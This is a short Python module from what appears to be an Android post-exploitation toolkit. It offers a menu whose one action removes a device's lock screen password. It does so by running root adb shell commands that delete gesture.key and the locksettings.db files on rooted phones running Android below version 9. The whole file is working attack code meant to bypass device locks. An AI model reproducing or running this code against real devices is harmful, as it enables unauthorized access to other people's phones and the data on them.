from core.adb.device_manager import DeviceManager
from core.utils import session_manager
import subprocess

dm = DeviceManager()


def post_exploitation_menu():
    while True:
        # show global menu header
        try:
            print(session_manager.get_menu_header())
        except Exception:
            pass
        print("\n[ Post-Exploitation Menu ]")
        print("1. Remove device password")
        print("2. Back to Main Menu")
        choice = input("> ").strip()
        if choice == "1":
            remove_password()
        elif choice == "2":
            break
        else:
            print("Invalid choice.")


def remove_password():
    device = dm.get_current_device()
    if not device:
        print("No device connected.")
        return
    print("Removing device password...")
    print("Will only work on versions < 9 and rooted phones")
    cmds = [
        f"adb -s {device} shell su 0 'rm /data/system/gesture.key'",
        f"adb -s {device} shell su 0 'rm /data/system/locksettings.db'",
        f"adb -s {device} shell su 0 'rm /data/system/locksettings.db-wal'",
        f"adb -s {device} shell su 0 'rm /data/system/locksettings.db-shm'",
        # add synthetic password/key wipe here as needed
    ]
    for c in cmds:
        subprocess.run(c, shell=True)
    print("Password removed. Device might reboot or unlock on next boot.")
